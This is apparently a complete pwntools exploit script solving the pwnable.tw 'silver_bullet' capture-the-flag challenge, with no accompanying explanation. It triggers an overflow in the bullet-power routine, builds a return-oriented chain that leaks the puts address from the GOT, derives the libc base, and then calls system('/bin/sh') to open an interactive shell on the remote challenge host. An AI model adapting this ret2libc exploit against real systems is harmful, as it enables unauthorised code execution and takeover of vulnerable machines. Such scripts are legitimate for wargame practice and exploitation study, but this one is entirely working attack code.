from pwn import *
context.log_level = 'debug'
prog = './silver_bullet'
elf = ELF(prog)
#p = process(prog)
p = remote("chall.pwnable.tw", 10103)
libc = ELF("./libc_32.so.6")

def create(payload):
	p.sendlineafter("Your choice :", '1')
	p.sendafter("bullet :", payload)

def power(payload):
	p.sendlineafter("Your choice :", '2')
	p.sendafter("bullet :", payload)

start = 0x80484f0
def exp():
	
	create("a"*47)
	power("a")
	payload = '\xff'*(3+4) + p32(elf.plt['puts']) + p32(start) + p32(elf.got['puts']) 
	power(payload)
	p.sendlineafter("Your choice :", '3')
	p.recvuntil("You win !!\n")
	puts_addr = u32(p.recv(4))
	log.info("puts_addr is " + hex(puts_addr))
	libc_base = puts_addr - libc.sym['puts']
	log.info("libc_base is " + hex(libc_base))
	system = libc_base + libc.sym['system']
	binsh = libc_base + libc.search('/bin/sh').next()

	create("a"*47)
	power("a")
	payload = '\xff'*(3+4) + p32(system) + p32(start) + p32(binsh)
	power(payload)
	p.sendlineafter("Your choice :", '3')
	p.interactive()
if __name__ == '__main__':
	exp()
